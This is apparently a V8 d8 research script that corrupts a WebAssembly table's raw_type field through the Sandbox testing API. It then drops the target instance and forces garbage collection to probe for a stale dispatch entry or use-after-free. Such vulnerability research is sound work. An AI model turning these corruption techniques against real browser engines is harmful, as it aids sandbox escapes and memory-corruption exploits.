// C21 H18: stale trusted dispatch entry across instances after raw_type desync.
//
// Module B imports a JS funcref table and calls table[0] indirectly. Module A
// supplies the target function. Then raw_type is corrupted to externref, JS sets
// table[0] to null, and normal JS references to Module A are dropped.
//
// Goal: determine whether stale trusted_dispatch_table state is a hidden root,
// stale/UAF candidate, or cleanly invalidated.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kHeapObjectTag = 1;
const kWasmTableObjectType =
    Sandbox.getInstanceTypeIdFor('WASM_TABLE_OBJECT_TYPE');
const kRawTypeOffset = Sandbox.getFieldOffset(kWasmTableObjectType, 'raw_type');
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function tagged(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function rawTypeField(table) {
  return memory.getUint32(tagged(table) + kRawTypeOffset - kHeapObjectTag, true);
}

function corruptRawType(table, rawTypeSmi) {
  Sandbox.corruptObjectField(table, 'raw_type', rawTypeSmi);
}

function makeTargetInstance(delta) {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  b.addFunction('target', sig)
      .addBody([kExprLocalGet, 0, kExprI32Const, delta, kExprI32Add])
      .exportFunc();
  return b.instantiate();
}

function makeCallerInstance(table) {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  let t = b.addImportedTable('imp', 'table', 1, 1, kWasmFuncRef);
  b.addFunction('call', kSig_i_ii)
      .addBody([
        kExprLocalGet, 1,
        kExprLocalGet, 0,
        kExprCallIndirect, sig, t,
      ])
      .exportFunc();
  return b.instantiate({imp: {table}});
}

let externTable = new WebAssembly.Table({element: 'externref', initial: 1});
let externRefRawTypeSmi = rawTypeField(externTable);

let table = new WebAssembly.Table({element: 'anyfunc', initial: 1, maximum: 1});
let targetInstance = makeTargetInstance(0x33);
let target = targetInstance.exports.target;
let callerInstance = makeCallerInstance(table);
let call = callerInstance.exports.call;

table.set(0, target);
print(`funcref_raw=0x${rawTypeField(table).toString(16)}`);
print(`externref_raw=0x${externRefRawTypeSmi.toString(16)}`);
print(`before=${call(0, 9)}`);

corruptRawType(table, externRefRawTypeSmi);
table.set(0, null);
print(`entry_is_null=${table.get(0) === null}`);
print(`after_null=${call(0, 9)}`);

let weakTarget = new WeakRef(target);
let weakInstance = new WeakRef(targetInstance);
target = null;
targetInstance = null;

for (let r = 0; r < 8; r++) {
  gc();
  let junk = [];
  for (let i = 0; i < 20000; i++) junk.push({i, pad: i + 1});
}
gc();

print(`weak_target_alive=${weakTarget.deref() !== undefined}`);
print(`weak_instance_alive=${weakInstance.deref() !== undefined}`);

try {
  print(`after_gc=${call(0, 9)}`);
} catch (e) {
  print(`after_gc_throw=${e.name}:${e.message}`);
}
